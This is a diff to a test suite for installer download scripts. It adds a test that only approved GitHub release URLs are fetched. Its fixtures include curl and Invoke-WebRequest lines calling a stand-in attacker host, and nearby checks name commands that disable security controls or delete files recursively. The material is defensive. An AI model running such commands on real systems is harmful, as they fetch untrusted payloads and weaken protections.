@@ -11,6 +11,7 @@ import {
   validateChecksumText,
   validateReleaseManifest,
 } from '../../scripts/verify-release-assets.mjs'
+import { verifyInstallerNetworkPolicy } from '../../scripts/installer-network-policy.mjs'
 
 interface FixtureAsset {
   name: string
@@ -364,6 +365,22 @@ describe('downloader static safety', () => {
       expect(script).not.toMatch(/xattr\s+-[a-z]*d|spctl|Set-MpPreference|ExecutionPolicy\s+Bypass/i)
       expect(script).not.toMatch(/rm\s+-rf|Remove-Item[^\n]*-Recurse/i)
     }
+  })
+
+  it('extracts every downloader network expression and permits only the exact GitHub release roots', () => {
+    expect(verifyInstallerNetworkPolicy(shell(), powershell())).toEqual({
+      shell: ['$API_URL', '$RELEASE_ROOT/$TAG/$INSTALLER_NAME', '$RELEASE_ROOT/$TAG/SHA256SUMS'],
+      powershell: ['$ApiUrl', '$ReleaseRoot/$Tag/$InstallerName', '$ReleaseRoot/$Tag/SHA256SUMS'],
+    })
+    expect(() =>
+      verifyInstallerNetworkPolicy(`${shell()}\ntrue && curl "https://attacker.invalid/payload"\n`, powershell()),
+    ).toThrow(/unapproved installer network destination/i)
+    expect(() =>
+      verifyInstallerNetworkPolicy(
+        shell(),
+        `${powershell()}\nInvoke-WebRequest -Uri 'https://attacker.invalid/payload'\n`,
+      ),
+    ).toThrow(/unapproved installer network destination/i)
   })
 
   it('uses exact architecture mapping, local SHA-256 verification, and verified launch ordering', () => {
